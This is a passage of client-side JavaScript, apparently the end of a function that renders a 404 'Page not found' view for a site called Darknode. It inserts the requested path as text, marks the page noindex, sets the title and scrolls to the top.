    page.innerHTML = '<div class="wrap"><h1>Page not found</h1><p>There is no page at <code></code>. Check the address, or start from the home page.</p><a class="btn" href="/">Go to the home page</a></div>';
    page.querySelector("code").textContent = location.pathname;
    view.prepend(page);
    let robots = document.querySelector('meta[name="robots"]');
    if (!robots) { robots = document.createElement("meta"); robots.name = "robots"; document.head.appendChild(robots); }
    robots.content = "noindex";
    document.title = "Page not found — Darknode";
    window.scrollTo(0, 0);
  }
}
